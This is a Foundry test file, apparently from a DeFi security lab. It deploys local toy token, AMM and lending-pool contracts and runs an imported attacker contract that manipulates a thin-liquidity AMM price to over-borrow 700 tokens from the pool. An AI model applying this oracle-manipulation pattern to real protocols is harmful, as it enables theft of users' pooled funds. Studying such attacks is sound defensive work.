// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/Token.sol";
import "../contracts/AMM.sol";
import "../contracts/LendingPool.sol";
import "../exploit/Attacker.sol";

contract OracleManipulationTest is Test {
    ERC20Mintable tokenA; // collateral
    ERC20Mintable tokenB; // borrow asset
    SimpleAMM amm;
    LendingPool pool;
    OracleAttacker attacker;

    address liquidityProvider = address(0xBEEF);
    address payable attackerEOA = payable(address(0xA11CE));

    function setUp() public {
        tokenA = new ERC20Mintable("TokenA", "TKA");
        tokenB = new ERC20Mintable("TokenB", "TKB");

        amm = new SimpleAMM(tokenA, tokenB);
        pool = new LendingPool(tokenA, tokenB, amm);

        // ⚠️ Dünne Liquidität, damit die Preismanipulation stark wirkt: 10 A : 10 B
        tokenA.mint(liquidityProvider, 10 ether);
        tokenB.mint(liquidityProvider, 10 ether);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(amm), type(uint256).max);
        tokenB.approve(address(amm), type(uint256).max);
        amm.addLiquidity(10 ether, 10 ether);
        vm.stopPrank();

        // Pool mit B füllen, damit etwas zu leihen da ist
        tokenB.mint(address(pool), 800 ether);

        // Angreifer-Contract deployen (Owner = attackerEOA) und mit B + etwas A versorgen
        vm.startPrank(attackerEOA);
        attacker = new OracleAttacker(tokenA, tokenB, amm, pool);
        tokenB.mint(address(attacker), 900 ether); // für Manipulation
        tokenA.mint(address(attacker), 1 ether);   // kleines Collateral
        vm.stopPrank();
    }

    function testExploitOracleManipulation() public {
        uint256 poolBBefore = tokenB.balanceOf(address(pool));

        // 900 B rein, 1 A als Collateral, 700 B leihen (sollte jetzt klappen)
        vm.prank(attackerEOA);
        attacker.execute(900 ether, 1 ether, 700 ether);

        uint256 poolBAfter = tokenB.balanceOf(address(pool));
        uint256 profitB = tokenB.balanceOf(attackerEOA);

        assertLt(poolBAfter, poolBBefore, "Pool B should decrease");
        assertGe(profitB, 700 ether, "Attacker should receive borrowed B");
    }
}
